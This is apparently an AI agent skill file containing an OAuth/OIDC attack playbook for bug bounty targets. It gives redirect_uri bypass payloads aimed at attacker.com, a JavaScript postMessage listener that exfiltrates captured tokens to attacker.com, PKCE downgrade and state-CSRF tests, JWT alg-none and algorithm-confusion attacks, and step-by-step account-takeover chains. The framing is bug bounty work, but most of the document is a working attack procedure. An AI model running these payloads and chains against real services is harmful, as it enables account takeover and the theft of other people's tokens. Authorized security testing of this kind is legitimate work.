---
name: oauth-attacks
description: Use when attacking OAuth 2.0 or OIDC implementations, testing for authorization code interception, PKCE bypass, open redirect chains, token leakage via referer, state parameter CSRF, token substitution, JWT confusion, implicit flow token theft, or OAuth misconfiguration in bug bounty targets. Also use when the user says "attack OAuth", "OAuth bug", "PKCE bypass", "redirect_uri bypass", "token leakage", or "SSO attack".
---

# OAuth 2.0 / OIDC Attack Playbook

## Philosophy
OAuth bugs are the highest-paying web vulns on HackerOne. They chain directly to account takeover.
The attacker controls the redirect. Find one open redirect on the OAuth domain and you own the flow.
Never claim "account takeover" without demonstrating actual token receipt for another user's account.

## Arguments
`<target>` - domain with OAuth (e.g. app.target.com)
`<focus>` - optional: REDIRECT / CSRF / TOKEN-LEAK / JWT / PKCE / FULL

---

## Phase 1 - OAuth Endpoint Discovery

```bash
# Common OAuth endpoints:
# Authorization: /oauth/authorize, /auth/oauth, /connect/authorize, /oauth2/authorize
# Token: /oauth/token, /token, /auth/token, /oauth2/token
# OIDC discovery (machine-readable endpoint list):
curl https://<target>/.well-known/openid-configuration
curl https://<target>/.well-known/oauth-authorization-server

# Also check:
curl https://<target>/.well-known/jwks.json          # Public keys used to sign tokens
curl https://<target>/oauth2/v1/certs                # Google-style

# Extract from JS bundles:
grep -r "oauth\|authorize\|client_id\|redirect_uri\|client_secret" ./js_bundles/

# Extract client_id and redirect_uri from login buttons:
# "Sign in with Google/GitHub/etc." -> view source -> find OAuth params in link
# client_id = app's registered ID with the provider
# redirect_uri = where provider sends code/token

# Test OIDC discovery for full metadata:
curl https://<target>/.well-known/openid-configuration | python3 -m json.tool
# Note: authorization_endpoint, token_endpoint, jwks_uri, response_types_supported
```

---

## Phase 2 - Redirect URI Bypass (Highest Impact)

**Goal:** Redirect the authorization code/token to attacker-controlled URL

```bash
# The registered redirect_uri is supposed to be exact-match validated.
# These bypass techniques work when validation is prefix-match or loose:

BASE_URI="https://app.target.com/oauth/callback"
CLIENT_ID="<client-id>"
AUTH_URL="https://provider.target.com/oauth/authorize"

# 1. Path traversal bypass (if prefix match validation):
${AUTH_URL}?client_id=${CLIENT_ID}&redirect_uri=https://app.target.com/oauth/callback/../../../attacker.com&response_type=code

# 2. URL fragment bypass:
redirect_uri=https://app.target.com/oauth/callback%23@attacker.com
redirect_uri=https://app.target.com/oauth/callback%23attacker.com/

# 3. Subdomain wildcard abuse:
redirect_uri=https://evil.app.target.com/oauth/callback  # if *.target.com allowed

# 4. Open redirect chain (MOST COMMON BUG):
# Step 1: Find open redirect on app.target.com:
#   https://app.target.com/redirect?url=https://attacker.com
# Step 2: Use open redirect as redirect_uri:
redirect_uri=https://app.target.com/redirect?url=https://attacker.com
# Code arrives at open redirect -> bounces to attacker with ?code=AUTH_CODE in URL

# 5. URL normalization tricks:
redirect_uri=https://app.target.com%2F@attacker.com/
redirect_uri=https://app.target.com:443@attacker.com/
redirect_uri=https://app.target.com\.attacker.com/

# 6. Localhost/127.0.0.1 (if developer apps allowed):
redirect_uri=http://localhost:8080/callback

# Test all manually in browser - Burp intercept OAuth flow, modify redirect_uri
# Evidence needed: authorization code received at attacker.com logs
```

---

## Phase 3 - CSRF (Missing or Bypassable State Parameter)

**Goal:** Force victim to connect their OAuth account to attacker's account

```bash
# State parameter should be: random, per-request, verified on callback
# CSRF attack (state missing or not validated):

# Step 1: Start OAuth flow, intercept authorize request
# Step 2: Note the authorization URL (with your state if any)
# Step 3: Stop before completing callback - DO NOT exchange code
# Step 4: Send the incomplete authorization URL to victim
# Step 5: When victim visits, they initiate their own OAuth flow
# Step 6: Their code gets exchanged with YOUR account state
# Result: victim's OAuth identity linked to your account = ATO

# Test: does OAuth flow check state on callback?
# Remove ?state= from callback URL -> does it still work?
# Replace state value with arbitrary string -> does it still work?
# If yes to either: CSRF confirmed

# PKCE as CSRF protection (code_challenge):
# If app uses PKCE correctly, CSRF above won't work even without state
# But: does app also support non-PKCE flows? If it accepts requests without code_challenge -> bypass

# Automation test:
curl "https://<target>/oauth/callback?code=<test-code>&state=INVALID_STATE"
# If 200 and session created = CSRF vulnerability confirmed
```

---

## Phase 4 - Token Leakage via Referer / postMessage

**Goal:** OAuth token/code leaks to third-party via HTTP Referer or postMessage

```bash
# Implicit flow (response_type=token) - token in URL fragment:
# URL fragment (#) is NOT sent in Referer header - BUT:
# If page JS reads location.hash and includes it in requests -> token leaks

# Authorization code leakage via Referer:
# If redirect page has: <script src="//analytics.vendor.com/...">
# Browser sends: Referer: https://app.target.com/oauth/callback?code=AUTH_CODE
# The authorization code is now in analytics logs!

# Test for third-party resources on OAuth callback page:
# 1. Complete OAuth flow in browser
# 2. DevTools -> Network -> look for requests FROM the callback page to OTHER domains
# 3. Check Referer value in those requests - does it contain ?code=...?

# postMessage leakage (OAuth in popup/iframe):
# Some SPAs open OAuth in popup, child sends token to parent via postMessage
# Vulnerable: targetOrigin is "*" (sends to any origin)
# Attack: open popup to target OAuth flow from attacker.com, listen for postMessage:
window.addEventListener('message', function(e) {
  // Capture token if targetOrigin was wildcard
  fetch('https://attacker.com/?token=' + JSON.stringify(e.data));
});
window.open('https://app.target.com/oauth/start?redirect_to=popup');
# If token received = confirmed ATO

# Fragment token leakage via open redirect:
# If redirect_uri page has open redirect: /callback?next=/any -> location changes
# Browser sends location.hash to new page via JS if page reads location.hash
```

---

## Phase 5 - PKCE Bypass & Code Interception

```bash
# PKCE flow: client sends code_challenge in authorize, code_verifier in token exchange
# Attack: does server REQUIRE PKCE? Or is it optional?

# Test 1: Remove PKCE from authorize request entirely
GET /oauth/authorize?client_id=<id>&response_type=code&redirect_uri=<uri>
# (no code_challenge or code_challenge_method)
# If authorization proceeds = PKCE not enforced

# Test 2: Downgrade S256 to plain
GET /oauth/authorize?...&code_challenge=<hash>&code_challenge_method=plain
# Then use raw verifier (not hashed) in token exchange

# Test 3: Auth code interception (PKCE correctly implemented but MitM possible):
# On mobile apps: deep link interception (another app claims same URL scheme)
# On web: open redirect catches code before PKCE exchange

# PKCE bruteforce (if code_challenge not properly implemented):
# code_verifier must be 43-128 chars, high entropy
# If app uses predictable verifier (timestamp, UUID) -> brute force range

# Test via Burp: intercept token exchange, try submitting code without code_verifier:
POST /oauth/token
grant_type=authorization_code&code=<code>&redirect_uri=<uri>&client_id=<id>
# (no code_verifier)
# If token returned = PKCE completely not enforced = critical
```

---

## Phase 6 - JWT/Token Attacks on OAuth Tokens

```bash
# Obtain your own OAuth access token, then attack it

# 1. Check algorithm (alg: none / RS256->HS256 confusion):
# Decode header: base64url decode token.split('.')[0]
echo "<header_b64>" | base64 -d 2>/dev/null | python3 -m json.tool
# If alg=RS256: try alg=HS256 signed with public key (see zerodayhunt Phase 29)
# If alg=RS256: try alg=none (remove signature entirely)

# 2. Claim manipulation (standard attacks):
python3 -c "
import base64, json, hmac, hashlib

# Decode
parts = '<TOKEN>'.split('.')
header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
print('HEADER:', json.dumps(header, indent=2))
print('PAYLOAD:', json.dumps(payload, indent=2))
# Look for: sub (user ID), role, scope, iss, aud, exp
"

# 3. Token substitution (sub claim swap):
# If OAuth provider and app use different user IDs as 'sub':
# App validates token signature but doesn't verify sub matches requesting user
# Get YOUR token, change sub to victim's user ID, resign (if you have key)

# 4. Scope escalation:
# Authorization request: scope=read
# Does token include extra scopes? scope=read write admin?
# Try using token for write/admin operations even if only read was requested

# 5. audience (aud) confusion:
# If app accepts tokens from any aud (not just its own client_id):
# Use a token issued for App A to authenticate to App B

# 6. Token lifetime check:
# exp in the past? Does server still accept it? = missing expiry validation
python3 -c "import jwt, datetime; t = jwt.decode('<token>', options={'verify_signature': False}); print(datetime.datetime.fromtimestamp(t['exp']))"

# 7. jwks_uri hijacking:
# Some apps fetch the JWK set from a URL embedded in token header ('jku' claim)
# If jku is not validated -> point it to attacker-controlled JWKS -> forge tokens
```

---

## Phase 7 - Token Leakage in Logs / Headers

```bash
# Tokens in URL parameters (implicit flow or bad implementation):
# Check access logs, referrer headers, server logs for token values

# Check if app sends token in GET (should always be POST + body):
# Burp -> search for "access_token" in GET requests
# If found in URL: token leaks to proxy logs, browser history, Referer headers

# Token in Authorization header -> confirm not logged:
# Ask support team for logs, or: find debug/logging endpoints
# /api/v1/logs, /admin/logs, /debug -> search for "Bearer" token strings

# Check for token in Slack/monitoring webhooks:
# Error reports often include full HTTP request including Authorization: Bearer ...

# OIDC id_token in URL (response_type=id_token):
# id_token contains user PII (email, name) in JWT payload
# If delivered via fragment + page makes requests to third-parties = PII leakage

# Test: complete OAuth flow with response_type=token (implicit)
# Monitor all HTTP requests leaving the browser on callback page
# Any request to CDN/analytics/pixel with Referer containing token = finding
```

---

## Phase 8 - OAuth Account Takeover Chains

### Chain A: Open Redirect -> Code Interception -> ATO
```
1. Find open redirect: GET /redirect?url=https://attacker.com -> 302 to attacker.com
2. Craft OAuth URL with redirect_uri pointing to open redirect:
   /oauth/authorize?client_id=X&redirect_uri=https://app.target.com/redirect?url=https://attacker.com&response_type=code&scope=openid
3. Victim clicks link, authorizes OAuth
4. Provider redirects to /redirect?url=https://attacker.com&code=AUTH_CODE
5. Open redirect bounces victim to https://attacker.com?code=AUTH_CODE
6. Attacker captures code from server logs
7. Exchange code for token (if no PKCE): POST /oauth/token {code: AUTH_CODE, client_id: X, ...}
8. Token = victim's account access
Evidence: actual auth code received in attacker server logs + token exchange success
```

### Chain B: CSRF -> Account Linking Takeover
```
1. Create account on target using email/password
2. Start OAuth "connect" flow (add Google login to existing account)
3. Don't complete - capture the half-complete authorize URL
4. Send this URL to victim
5. Victim (already logged in to target) completes OAuth consent
6. Their Google account is now linked to YOUR target account
7. Login with that Google account = access attacker's target account with victim's Google
Evidence: demonstrate victim's Google identity linked to attacker's target account session
```

### Chain C: subdomain takeover + OAuth origin check bypass
```
1. Find dangling CNAME on OAuth-registered origin (see zerodayhunt Phase 11)
2. Claim the subdomain (GitHub Pages, Heroku, etc.)
3. Host attacker page that receives OAuth code/token
4. Craft redirect_uri to that claimed subdomain (if wildcards allowed or loose validation)
5. Victim authorizes -> code arrives at your controlled subdomain
```

---

## Output

Write to `~/pentest-toolkit/results/<target>/interesting_oauth-attacks.md`:

```markdown
## Status
account-takeover | token-leaked | partial | no-findings

## Summary
<OAuth provider endpoints found, flows tested, chains discovered>

## Confirmed Findings
- [CONFIRMED] Open redirect at /redirect + OAuth redirect_uri bypass = auth code interception
  Evidence: <code received in attacker logs>
  Reproduce: <exact URL chain>

## Attack Chains
1. <chain name>: <step A> -> <step B> -> ATO
   Authorization status: tested with own accounts only

## Token Analysis
- Algorithm: <RS256/HS256/none>
- Claims: <sub, role, scope, exp>
- Vulnerabilities: <if any>

## Redirect URI Validation
| Test | Result |
|------|--------|
| Path traversal | BLOCKED/BYPASSED |
| Open redirect chain | VULNERABLE |
| Subdomain wildcard | N/A |
```

Tell user: "OAuth attack phase complete. `interesting_oauth-attacks.md` written. Key finding: <one-liner>. Run `/triage <target>` to aggregate."
